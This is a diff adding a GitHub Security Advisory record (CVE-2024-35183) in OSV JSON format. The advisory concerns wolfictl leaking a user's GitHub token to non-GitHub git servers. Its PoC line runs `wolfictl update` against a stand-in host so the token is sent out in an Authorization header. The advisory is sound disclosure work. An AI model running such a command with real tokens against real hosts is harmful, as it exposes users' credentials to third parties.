@@ -1,0 +1,82 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-8fg7-hp93-qhvr",
+  "modified": "2024-05-16T14:11:10Z",
+  "published": "2024-05-15T20:02:14Z",
+  "aliases": [
+    "CVE-2024-35183"
+  ],
+  "summary": "wolfictl leaks GitHub tokens to remote non-GitHub git servers",
+  "details": "### Summary\n\nA git authentication issue allows a local user’s GitHub token to be sent to remote servers other than `github.com`.\n\n### Details\n\nMost git-dependent functionality in wolfictl relies on its own `git` package, which contains centralized logic for implementing interactions with git repositories. Some of this functionality requires authentication in order to access private repositories. There’s a central function `GetGitAuth`:\n\nhttps://github.com/wolfi-dev/wolfictl/blob/6d99909f7b1aa23f732d84dad054b02a61f530e6/pkg/git/git.go#L22\n\nThis looks for a GitHub token in the environment variable `GITHUB_TOKEN` and returns it as an HTTP basic auth object to be used with the `github.com/go-git/go-git/v5` library.\n\nMost callers (direct or indirect) of `GetGitAuth` use the token to authenticate to github.com only; however, in some cases callers were passing this authentication without checking that the remote git repository was hosted on github.com.\n\n#### Issue 1\n\nOne of these callers processed git URLs from Melange package configurations, cloning the package’s upstream repository in order to determine which project dependencies have been upgraded since the prior update.\n\nhttps://github.com/wolfi-dev/wolfictl/blob/4dd6c95abb4bc0f9306350a8601057bd7a92bded/pkg/update/deps/cleanup.go#L49\n\nThis issue affects the command `wolfictl check update`, and the set of remote git hosts is a function of the Melange package configuration files residing in the local directory specified in the command.\n\n#### Issue 2\n\nAnother caller processes a git URL received as a command line argument and clones the repository to look for new available versions of the given project.\n\nhttps://github.com/wolfi-dev/wolfictl/blob/488b53823350caa706de3f01ec0eded9350c7da7/pkg/update/update.go#L143\n\nThis issue affects the command `wolfictl update`.\n\n---\n\nThis behavior has existed in one form or another since https://github.com/wolfi-dev/wolfictl/commit/0d06e1578300327c212dda26a5ab31d09352b9d0 - committed January 25, 2023.\n\n### PoC\n\n```shell\nGITHUB_TOKEN=test wolfictl update http://git.example.com/\n```\n\nExamining traffic sent to the remote server will show that the HTTP `Authorization` header contains `test` in base64 encoded format.\n\n### Impact\n\nThis impacts anyone who ran the `wolfictl check update` commands with a Melange configuration that included a `git-checkout` directive step that referenced a git repository not hosted on github.com. \n\nThis also impacts anyone who ran `wolfictl update <url>` with a remote URL outside of github.com. \n\nAdditionally, these subcommands must have run with the `GITHUB_TOKEN` environment variable set to a valid GitHub token.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/wolfi-dev/wolfictl"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.16.10"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/wolfi-dev/wolfictl/security/advisories/GHSA-8fg7-hp93-qhvr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35183"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/wolfi-dev/wolfictl/commit/0d06e1578300327c212dda26a5ab31d09352b9d0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/wolfi-dev/wolfictl/commit/403e93569f46766b4e26e06cf9cd0cae5ee0c2a2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/wolfi-dev/wolfictl"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/wolfi-dev/wolfictl/blob/488b53823350caa706de3f01ec0eded9350c7da7/pkg/update/update.go#L143"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/wolfi-dev/wolfictl/blob/4dd6c95abb4bc0f9306350a8601057bd7a92bded/pkg/update/deps/cleanup.go#L49"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/wolfi-dev/wolfictl/blob/6d99909f7b1aa23f732d84dad054b02a61f530e6/pkg/git/git.go#L22"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-552",
+      "CWE-668"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-05-15T20:02:14Z",
+    "nvd_published_at": "2024-05-15T22:15:08Z"
+  }
+}
